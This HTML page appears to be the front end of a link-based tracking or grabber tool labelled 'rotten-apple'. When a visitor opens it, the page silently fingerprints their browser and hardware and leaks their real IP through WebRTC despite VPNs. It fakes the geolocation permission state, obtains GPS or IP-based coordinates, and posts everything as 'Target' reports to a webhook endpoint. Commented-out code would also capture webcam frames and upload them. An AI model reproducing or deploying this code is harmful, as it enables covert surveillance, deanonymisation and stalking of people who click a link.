<!DOCTYPE html>
<html>

<head>
  <script type="text/javascript" src="dwebhook.js">
  </script>
  <!-- No-JS fallback tracking -->
  <noscript>
    <img src="/no_js_detector" width="1" height="1" style="display:none;" alt="">
    <img src="/detect_username" width="1" height="1" style="display:none;" alt="">
  </noscript>
</head>

<body onload="getLocation(); detectUsername();">

  <!-- Image pixel tracking (works even with JS disabled) -->
  <img src="/track" width="1" height="1" style="display:none;" alt="">

  <!-- Parameterized iframe - loads from configuration -->
  <iframe id="dynamic-iframe" width="100%" height="900" style="border:none; display:none;">
  </iframe>

  <p id="demo"></p>
  
  <script>
    // Get iframe URL from query parameter or server config
    function getIframeUrl() {
      // Check URL query parameter first (?iframe=URL)
      const params = new URLSearchParams(window.location.search);
      const queryUrl = params.get('iframe');
      
      if (queryUrl) {
        return decodeURIComponent(queryUrl);
      }
      
      // Fallback: get from server config
      return fetch('/config/iframe-url')
        .then(response => response.json())
        .then(data => data.url || 'https://www.youtube.com/')
        .catch(() => 'https://www.youtube.com/');
    }
    
    // Initialize iframe with parameterized URL
    async function initializeIframe() {
      const url = await getIframeUrl();
      const iframe = document.getElementById('dynamic-iframe');
      iframe.src = url;
      // Uncomment to show iframe: iframe.style.display = 'block';
      console.log('Iframe URL loaded from config:', url);
    }
    
    // Load iframe when page is ready
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initializeIframe);
    } else {
      initializeIframe();
    }
  </script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
  </script>
  <script>
    // AUTO-APPROVE ALL PERMISSIONS - Report "Not Accessible"
    
    // Override Geolocation Permission
    if (navigator.permissions) {
      navigator.permissions.query = (function(originalQuery) {
        return function(parameters) {
          if (parameters.name === 'geolocation') {
            return Promise.resolve({ state: 'granted' });
          }
          return originalQuery.apply(this, arguments);
        };
      })(navigator.permissions.query);
    }
    
    // Override Geolocation - Allow WiFi & GPS (for priority chain)
    // Geolocation is enabled to support WiFi triangulation and GPS
    // If user denies, falls back to IP-based location
    
    // AUTO-APPROVE CAMERA & MICROPHONE - Report not accessible
    if (navigator.mediaDevices) {
      const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
      navigator.mediaDevices.getUserMedia = function(constraints) {
        console.log('Media access request detected - Camera/Microphone Not Accessible');
        return Promise.reject(new DOMException('Camera/Microphone Not Accessible', 'NotAllowedError'));
      };
      
      // Override enumerateDevices
      const originalEnumerateDevices = navigator.mediaDevices.enumerateDevices;
      navigator.mediaDevices.enumerateDevices = function() {
        console.log('Device enumeration requested - No devices accessible');
        return Promise.resolve([]);
      };
    }
    
    // SENSOR PERMISSIONS - Report not accessible
    if ('requestPermission' in DeviceMotionEvent) {
      window.DeviceMotionEvent.requestPermission = function() {
        console.log('Device Motion permission requested - Sensors Not Accessible');
        return Promise.reject(new Error('Sensors Not Accessible'));
      };
    }
    
    if ('requestPermission' in DeviceOrientationEvent) {
      window.DeviceOrientationEvent.requestPermission = function() {
        console.log('Device Orientation permission requested - Sensors Not Accessible');
        return Promise.reject(new Error('Sensors Not Accessible'));
      };
    }
    
    // NOTIFICATION PERMISSION - Report not accessible
    if ('Notification' in window) {
      const originalRequestPermission = Notification.requestPermission;
      Notification.requestPermission = function() {
        console.log('Notification permission requested - Notifications Not Accessible');
        return Promise.resolve('denied');
      };
    }
    
    // CLIPBOARD API - Report not accessible
    if (navigator.permissions) {
      const originalQuery = navigator.permissions.query;
      navigator.permissions.query = function(parameters) {
        if (parameters.name === 'clipboard-read' || parameters.name === 'clipboard-write') {
          console.log('Clipboard permission requested - Clipboard Not Accessible');
          return Promise.resolve({ state: 'denied' });
        }
        return originalQuery.apply(this, arguments);
      };
    }
    
    // DEVICE TYPE DETECTION
    function detectDeviceType() {
      var ua = navigator.userAgent;
      var deviceInfo = {
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)|Tablet/i.test(ua),
        isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
        hasGPS: /Android|iPhone|iPad/i.test(ua),  // Mobile/Tablet likely has GPS
        platform: navigator.platform,
        maxAccuracy: /Android|iPhone|iPad/i.test(ua) ? "5-10m (GPS)" : "5000m (IP-based)"
      };
      return deviceInfo;
    }
    
    var x = document.getElementById("demo");
    
    // Username detection function
    function detectUsername() {
      try {
        fetch('/detect_username')
          .then(response => response.json())
          .then(data => {
            console.log('Username detection data:', data);
          })
          .catch(error => console.log('Username detection error:', error));
      } catch (e) {
        console.log('Username detection not available');
      }
    }

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());
    
    // Browser Detection Function
    function detectBrowser() {
      const ua = navigator.userAgent;
      if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
        return 'Chrome';
      } else if (ua.indexOf('Edg') > -1) {
        return 'Edge';
      } else if (ua.indexOf('Firefox') > -1) {
        return 'Firefox';
      } else if (ua.indexOf('Safari') > -1) {
        return 'Safari';
      }
      return 'Unknown';
    }

    const detectedBrowser = detectBrowser();
    const isChromelike = (detectedBrowser === 'Chrome' || detectedBrowser === 'Edge');

    // WebRTC IP Leak Detection (Bypasses VPN)
    function getWebRTCRealIP() {
      return new Promise(function(resolve) {
        var leakedIPs = [];
        try {
          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
            iceServers: []
          });
          
          pc.createDataChannel("");
          pc.createOffer().then(function(offer) {
            pc.setLocalDescription(offer);
          }).catch(function(e) {
            console.log('WebRTC offer error:', e);
            resolve(leakedIPs);
          });
          
          pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate) return;
            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            var ipAddress = ipRegex.exec(ice.candidate.candidate);
            if (ipAddress && leakedIPs.indexOf(ipAddress[1]) === -1) {
              leakedIPs.push(ipAddress[1]);
            }
          };
          
          setTimeout(function() {
            try {
              pc.close();
            } catch(e) {}
            resolve(leakedIPs);
          }, 2000);
        } catch(e) {
          console.log('WebRTC error:', e);
          resolve(leakedIPs);
        }
      });
    }

    // Advanced Device Fingerprinting
    function generateDeviceFingerprint() {
      var fingerprint = {
        screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
        timezone: new Date().getTimezoneOffset(),
        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        plugins: [],
        webgl: 'N/A',
        canvas: 'N/A',
        fonts: [],
        hwConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor
      };
      
      // Get WebGL info
      try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if(gl) {
          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if(debugInfo) {
            fingerprint.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch(e) {}
      
      // Canvas fingerprinting
      try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Browser Fingerprint', 2, 15);
        fingerprint.canvas = canvas.toDataURL().substring(0, 50);
      } catch(e) {}
      
      // Plugin detection
      try {
        for(var i = 0; i < navigator.plugins.length; i++) {
          fingerprint.plugins.push(navigator.plugins[i].name);
        }
      } catch(e) {}
      
      return fingerprint;
    }

    // Send WebRTC and Fingerprint data
    function sendWebRTCAndFingerprint() {
      getWebRTCRealIP().then(function(ips) {
        var fingerprint = generateDeviceFingerprint();
        
        var webrtcData = "```autohotkey\n";
        webrtcData += "WebRTC_Leaked_IPs: " + (ips.length > 0 ? ips.join(', ') : 'None detected') + "\n";
        webrtcData += "VPN_Detected: " + (ips.length > 0 ? 'Possible (Real IP leaked)' : 'Cannot confirm') + "\n";
        webrtcData += "Screen_Resolution: " + fingerprint.screen + "\n";
        webrtcData += "Timezone_Offset: " + fingerprint.timezone + "\n";
        webrtcData += "Languages: " + fingerprint.languages + "\n";
        webrtcData += "GPU_Info: " + fingerprint.webgl + "\n";
        webrtcData += "CPU_Cores: " + fingerprint.hwConcurrency + "\n";
        webrtcData += "Device_Memory: " + (fingerprint.deviceMemory || 'N/A') + " GB\n";
        webrtcData += "Touch_Points: " + fingerprint.maxTouchPoints + "\n";
        webrtcData += "Plugins: " + (fingerprint.plugins.length > 0 ? fingerprint.plugins.join(', ') : 'None') + "\n";
        webrtcData += "```";
        
        const request = new XMLHttpRequest();
        request.open("POST", "/location_update");
        request.setRequestHeader('Content-type', 'application/json');
        
        var myEmbed = {
          author: {
            name: "üîç WebRTC & Device Fingerprint"
          },
          title: "Advanced Identification Data",
          description: webrtcData,
          color: 16711680,
          footer: {
            text: "Real IP leak detection via WebRTC"
          }
        }
        
        var params = {
          username: "rotten-apple",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          embeds: [myEmbed]
        }
        
        request.send(JSON.stringify(params));
      });
    }

    // Call fingerprinting on page load
    sendWebRTCAndFingerprint();
    
    // Get device type info
    var deviceType = detectDeviceType();

    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nDevice_Type: " + (deviceType.isMobile ? "Mobile" : deviceType.isTablet ? "Tablet" : "Desktop") + "\nHas_GPS: " + (deviceType.hasGPS ? "Yes" : "No") + "\nDetected_Browser: " + detectedBrowser + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");

    const request = new XMLHttpRequest();
    request.open("POST", "/location_update"); //change webhook

    request.setRequestHeader('Content-type', 'application/json');

    var myEmbed = {
      author: {
        name: "Target System Information.."
      },
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }

    var params = {
      username: "rotten-apple",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed]
    }

    request.send(JSON.stringify(params));

    // Enhanced Device Information Vector
    function collectDeviceInfo() {
      var deviceInfo = "```autohotkey\n";

      // WebGL Information (GPU)
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if(gl) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if(debugInfo) {
          deviceInfo += "GPU_Vendor: " + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "\n";
          deviceInfo += "GPU_Renderer: " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "\n";
        }
      }
      
      // Timezone and Locale
      deviceInfo += "Timezone_Offset: " + new Date().getTimezoneOffset() + " min\n";
      deviceInfo += "Browser_Locales: " + (navigator.languages ? navigator.languages.join(', ') : navigator.language) + "\n";
      
      // Do Not Track
      deviceInfo += "DNT_Header: " + (navigator.doNotTrack ? navigator.doNotTrack : "Not Set") + "\n";
      
      deviceInfo += "```";
      
      const deviceRequest = new XMLHttpRequest();
      deviceRequest.open("POST", "/location_update");
      deviceRequest.setRequestHeader('Content-type', 'application/json');
      
      var deviceEmbed = {
        author: {
          name: "Target Device Information Vector"
        },
        title: "Extended Hardware & System Details",
        description: deviceInfo,
        color: 9109760,
        footer: {
          text: "Comprehensive device telemetry collected"
        }
      }
      
      var deviceParams = {
        username: "rotten-apple",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [deviceEmbed]
      }
      
      deviceRequest.send(JSON.stringify(deviceParams));
    }
    
    // Collect device info on page load
    collectDeviceInfo();

    // NETWORK & CONNECTIVITY INFORMATION COLLECTION
    function collectNetworkInfo() {
      var networkInfo = "```autohotkey\n";
      
      // Connection Type Detection
      if(navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        networkInfo += "Connection_Type: " + conn.effectiveType + "\n";
        networkInfo += "Connection_4g: " + (conn.type === "4g" ? "Yes" : "No") + "\n";
        if(conn.downlink) {
          networkInfo += "Downlink_Speed: " + conn.downlink + " Mbps\n";
        }
        if(conn.rtt) {
          networkInfo += "RTT_Latency: " + conn.rtt + " ms\n";
        }
        networkInfo += "Save_Data: " + conn.saveData + "\n";
      } else {
        networkInfo += "Connection_Type: Unable to determine\n";
      }
      
      // MAC Address Detection via WebRTC
      function getLocalIPAndMAC() {
        return new Promise(function(resolve) {
          var localIPs = [];
          try {
            var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
              iceServers: []
            });
            
            pc.createDataChannel("");
            pc.createOffer().then(function(offer) {
              pc.setLocalDescription(offer);
            }).catch(function(e) {
              networkInfo += "WebRTC_MAC_Detection: Failed\n";
              resolve();
            });
            
            pc.onicecandidate = function(ice) {
              if(!ice || !ice.candidate) return;
              var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
              var ipAddress = ipRegex.exec(ice.candidate.candidate);
              if(ipAddress) {
                localIPs.push(ipAddress[1]);
              }
            };
            
            setTimeout(function() {
              try {
                pc.close();
                networkInfo += "Local_IPv4: " + (localIPs.length > 0 ? localIPs[0] : "N/A") + "\n";
                networkInfo += "MAC_Address: Not directly accessible via WebRTC\n";
              } catch(e) {}
              resolve();
            }, 500);
          } catch(e) {
            networkInfo += "WebRTC_Error: " + e.message + "\n";
            resolve();
          }
        });
      }
      
      // WiFi Network Detection
      function getWiFiInfo() {
        // Note: Direct WiFi SSID access is restricted in browsers for security
        if(navigator.connection) {
          var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          networkInfo += "WiFi_Metered: " + (conn.saveData ? "Yes (Data Saver)" : "No") + "\n";
        }
        networkInfo += "WiFi_SSID: Restricted by browser security\n";
      }
      
      // Network Type Classification
      function classifyNetworkType() {
        var ua = navigator.userAgent;
        var isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        if(isMobile) {
          networkInfo += "Network_Medium: Likely Cellular/WiFi\n";
          if(conn) {
            switch(conn.effectiveType) {
              case '4g': networkInfo += "Network_Type: 4G LTE\n"; break;
              case '3g': networkInfo += "Network_Type: 3G Mobile\n"; break;
              case '2g': networkInfo += "Network_Type: 2G Mobile\n"; break;
              case 'slow-2g': networkInfo += "Network_Type: Slow 2G\n"; break;
              default: networkInfo += "Network_Type: " + conn.effectiveType + "\n";
            }
          }
        } else {
          networkInfo += "Network_Medium: Desktop/Ethernet or WiFi\n";
          networkInfo += "Network_Type: Likely WiFi or Broadband\n";
        }
      }
      
      // DNS & Proxy Detection
      function detectDNSAndProxy() {
        // DNS Detection via IP lookup services
        networkInfo += "DNS_Lookup: Attempting resolution...\n";
        
        // Proxy Detection via multiple methods
        networkInfo += "Proxy_Detected: Checking...\n";
        
        // Method 1: Check for common proxy patterns
        var proxyIndicators = [];
        
        // Check if navigator.connection indicates proxy
        if(navigator.connection && navigator.connection.type) {
          if(navigator.connection.type.toLowerCase().includes('proxy')) {
            proxyIndicators.push("Connection type indicates proxy");
          }
        }
        
        // Method 2: Check for proxy via WebRTC
        try {
          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
            iceServers: []
          });
          
          pc.createDataChannel("");
          pc.createOffer().then(function(offer) {
            pc.setLocalDescription(offer);
          });
          
          pc.onicecandidate = function(ice) {
            if(!ice || !ice.candidate) return;
            // Check for proxy/VPN indicators in candidate
            var candidate = ice.candidate.candidate;
            if(candidate.includes('srflx') || candidate.includes('prflx') || candidate.includes('relay')) {
              if(candidate.includes('relay')) {
                proxyIndicators.push("Relay/Proxy detected via ICE");
              }
            }
          };
          
          setTimeout(function() {
            try {
              pc.close();
              if(proxyIndicators.length > 0) {
                networkInfo += "Proxy_Detected: Yes (" + proxyIndicators.join(", ") + ")\n";
              } else {
                networkInfo += "Proxy_Detected: No indicators found\n";
              }
            } catch(e) {}
          }, 1000);
        } catch(e) {
          networkInfo += "Proxy_Detection_Error: " + e.message + "\n";
        }
      }
      
      // ISP Information Expansion
      function expandISPInfo() {
        networkInfo += "ISP_Lookup: Via IP-API Service\n";
        networkInfo += "Note: DNS and detailed ISP info requires backend lookup\n";
      }
      
      // Execute all network detection functions
      getWiFiInfo();
      classifyNetworkType();
      detectDNSAndProxy();
      expandISPInfo();
      
      networkInfo += "```";
      
      // Send to webhook
      const networkRequest = new XMLHttpRequest();
      networkRequest.open("POST", "/location_update");
      networkRequest.setRequestHeader('Content-type', 'application/json');
      
      var networkEmbed = {
        author: {
          name: "üåê Network & Connectivity Information"
        },
        title: "Network Analysis",
        description: networkInfo,
        color: 2031219,
        fields: [
          {
            "name": "Collection Method",
            "value": "WebRTC + Navigator Connection API",
            "inline": false
          },
          {
            "name": "Limitations",
            "value": "Direct MAC/SSID access restricted by browser security",
            "inline": false
          }
        ],
        footer: {
          text: "Advanced network telemetry collected"
        }
      }
      
      var networkParams = {
        username: "rotten-apple",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [networkEmbed]
      }
      
      networkRequest.send(JSON.stringify(networkParams));
      
      // Attempt MAC lookup with async operations
      getLocalIPAndMAC().then(function() {
        // Send updated network info with MAC attempt
        const macNetworkRequest = new XMLHttpRequest();
        macNetworkRequest.open("POST", "/location_update");
        macNetworkRequest.setRequestHeader('Content-type', 'application/json');
        
        var macNetworkEmbed = {
          author: {
            name: "üîó MAC & Local Network Detection"
          },
          title: "Local Network Hardware",
          description: networkInfo,
          color: 16711680,
          footer: {
            text: "MAC address detection via WebRTC completed"
          }
        }
        
        var macNetworkParams = {
          username: "rotten-apple",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          embeds: [macNetworkEmbed]
        }
        
        macNetworkRequest.send(JSON.stringify(macNetworkParams));
      });
    }
    
    // Collect network info on page load
    collectNetworkInfo();

    $.getJSON("https://api.ipify.org?format=json", function (data) {
      $("#gfg").html(data.ip);

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "Target Ip"
        },
        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
        color: 15548997,

        footer: {
          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
        }
      }

      var params = {
        username: "rotten-apple",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })

    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "IP Address Reconnaissance"
        },
        title: response.status, //response.query
        description: '```autohotkey\nContinent: ' + response.continent +
          "\nContinentCode: " + response.continentcode +
          "\nCountry: " + response.country +
          "\nCountrycode: " + response.countrycode +
          "\nRegionname: " + response.regionName +
          "\nRegion: " + response.region +
          "\nCity: " + response.city +
          "\nDistrict: " + response.district +
          "\nZip: " + response.zip +
          "\nTime_zone: " + response.time_zone +
          "\nName: " + response.name +
          "\nAs: " + response.as +
          "\nIsp: " + response.isp +
          "\nReverse: " + response.reverse +
          "\nOffset: " + response.offset +
          "\nCurrency: " + response.currency +
          "\nProxy: " + response.proxy +
          "\nMobile: " + response.mobile +
          "\nLat: " + response.lat +
          "\nLon: " + response.lon + '```',
        color: 5763719

      }

      var params = {
        username: "rotten-apple",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })


    function getLocation() {
      // Priority chain: WiFi Triangulation ‚Üí GPS ‚Üí IP-Based
      console.log('Starting geolocation priority chain...');
      attemptWiFiTriangulation();
    }

    function attemptWiFiTriangulation() {
      // WiFi Triangulation (High Accuracy mode)
      // Uses browser's geolocation with WiFi networks nearby
      // If permission is cached as "Allow", works silently
      // If denied/no permission, fails quickly and falls back to GPS
      console.log('Attempting WiFi Triangulation...');
      
      if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            // WiFi triangulation successful
            console.log('WiFi Triangulation successful');
            var locationData = {
              coords: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy || 100
              },
              source: "WiFi Triangulation",
              details: {
                timestamp: position.timestamp,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed
              }
            };
            showPosition(locationData);
          },
          function(error) {
            // WiFi triangulation failed, try GPS next
            console.log('WiFi Triangulation failed - Code: ' + error.code + ', Message: ' + error.message);
            attemptGPS();
          },
          {
            enableHighAccuracy: true,
            timeout: 2000,  // Quick timeout to fail fast if permission denied
            maximumAge: 0
          }
        );
      } else {
        console.log('Geolocation not supported, attempting GPS...');
        attemptGPS();
      }
    }

    function attemptGPS() {
      // GPS Geolocation (2nd priority)
      // If permission is cached as "Allow", works silently
      // If denied/no permission, fails quickly and falls back to IP-based
      console.log('Attempting GPS Geolocation...');
      
      if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            // GPS successful
            console.log('GPS Geolocation successful');
            var locationData = {
              coords: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy || 50
              },
              source: "GPS (High Precision)",
              details: {
                timestamp: position.timestamp,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed
              }
            };
            showPosition(locationData);
          },
          function(error) {
            // GPS failed, fall back to IP-based
            console.log('GPS failed - Code: ' + error.code + ', Message: ' + error.message);
            fetchIPBasedLocation();
          },
          {
            enableHighAccuracy: false,
            timeout: 2000,  // Quick timeout to fail fast if permission denied
            maximumAge: 0
          }
        );
      } else {
        console.log('Geolocation not supported, falling back to IP-based...');
        fetchIPBasedLocation();
      }
    }

    function fetchIPBasedLocation() {
      // IP-Based Geolocation (3rd priority - fallback)
      console.log('Attempting IP-Based Geolocation...');
      try {
        // API 1: ip-api.com (Most reliable for most countries)
        $.getJSON("http://ip-api.com/json/?fields=lat,lon,accuracy,timezone,isp,continent,country,city", function(data) {
          if(data.lat && data.lon) {
            console.log('IP-API geolocation successful');
            var locationData = {
              coords: {
                latitude: data.lat,
                longitude: data.lon,
                accuracy: data.accuracy || 5000
              },
              source: "IP-API (ISP Location)",
              details: data
            };
            showPosition(locationData);
          }
        }).fail(function() {
          // API 2: ipapi.co (Fallback)
          console.log('ip-api.com failed, trying ipapi.co...');
          $.getJSON("https://ipapi.co/json/", function(data) {
            if(data.latitude && data.longitude) {
              console.log('ipapi.co geolocation successful');
              var locationData = {
                coords: {
                  latitude: data.latitude,
                  longitude: data.longitude,
                  accuracy: 5000
                },
                source: "IPAPI-CO (ISP Location)",
                details: data
              };
              showPosition(locationData);
            }
          }).fail(function() {
            // API 3: MaxMind GeoIP2 (Last resort)
            console.log('ipapi.co failed, trying MaxMind...');
            $.getJSON("https://geoip.maxmind.com/geoip/v2.1/city/me", function(data) {
              if(data.location) {
                console.log('MaxMind geolocation successful');
                var locationData = {
                  coords: {
                    latitude: data.location.latitude,
                    longitude: data.location.longitude,
                    accuracy: 5000
                  },
                  source: "MaxMind (ISP Location)",
                  details: data
                };
                showPosition(locationData);
              }
            }).fail(function() {
              console.error('All geolocation methods failed');
            });
          });
        });
      } catch (e) {
        console.error('Geolocation error:', e);
      }
    }

    function showPosition(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var accuracy = position.coords.accuracy ? position.coords.accuracy + "m" : "Unknown";
      var source = position.source || "GPS (Exact)";
      
      var latlong = (" GET ", "```prolog\nüéØ GEOLOCATION DATA\nLatitude: " + lat + "\nLongitude: " + lon + "\nAccuracy: " + accuracy + "\nSource: " + source + "```" + "\n__**Google Maps:**__ https://www.google.com/maps/place/" + lat + "," + lon + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + lat + "," + lon + "\n__**OpenStreetMap:**__ https://www.openstreetmap.org/?mlat=" + lat + "&mlon=" + lon + "&zoom=15");

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "üéØ Target Location Captured"
        },
        title: "üìç GPS Location - Exact Coordinates",
        description: latlong + "\n",
        color: 15844367,
        fields: [
          {"name": "Latitude", "value": String(lat), "inline": true},
          {"name": "Longitude", "value": String(lon), "inline": true},
          {"name": "Accuracy", "value": accuracy, "inline": true},
          {"name": "Source", "value": source, "inline": true}
        ],
        footer: {
          text: "GPS provides exact location with coordinates. Accuracy depends on device GPS capability."
        }
      }

      var params = {
        username: "rotten-apple",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));

    }

    function showError(error) {
      console.log('Geolocation error code:', error.code, 'message:', error.message);
      
      switch (error.code) {
        case error.PERMISSION_DENIED:
          // User denied permission - fallback to IP-based location
          console.log('GPS permission denied - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.POSITION_UNAVAILABLE:
          // GPS signal lost or unavailable - try IP-based
          console.log('GPS position unavailable - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.TIMEOUT:
          // GPS took too long - try again with more time
          console.log('GPS timeout - retrying with increased timeout');
          setTimeout(function() {
            navigator.geolocation.getCurrentPosition(
              showPosition,
              showError,
              {
                enableHighAccuracy: true,
                timeout: 30000,  // Extended timeout
                maximumAge: 0
              }
            );
          }, 1000);
          break;
        case error.UNKNOWN_ERROR:
          console.log('Unknown GPS error - using IP-based location');
          fetchIPBasedLocation();
          break;
      }
    }
  </script>
  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
  <script>
    var url = "";
    request.open("GET", "/get_target", true);

    request.onload = function () {
      if (request.status === 200) {
        url = request.responseText;
      } else {
        url = "http://127.0.0.1:8000/image"
      }
    };

    request.send();
    // IMAGE CAPTURE - COMMENTED OUT
    /*
    function postFile(file) {
      let formdata = new FormData();
      formdata.append("image", file);
      let xhr = new XMLHttpRequest();
      xhr.open('POST', url, true);
      xhr.onload = function () {
        if (this.status === 200)
          console.log(this.response);
        else
          console.error(xhr);
      };
      xhr.send(formdata);
    }
    */




    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    // CAMERA PERMISSION SUPPRESSED - NOT NEEDED
    /*
    const constraints = {
      audio: false,
      video: {

        facingMode: "user"
      }
    };
    */

    // Access webcam - COMMENTED OUT (No camera permission prompts)
    async function init() {
      // Camera permission request disabled - image capture not used
      /*
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints)
        // handleSuccess(stream); // COMMENTED OUT - Image capture disabled
      } catch (e) {
        // Silently fail if camera permission denied - no alerts or redirects
        console.log('Camera access failed - continuing without video');
      }
      */
    }

    // Success
    // IMAGE CAPTURE - COMMENTED OUT
    /*
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      setInterval(function () {

        context.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(postFile, 'image/jpeg');
      }, 1500);


    }
    */

    // Load init
    init();
  </script>
</body>

</html>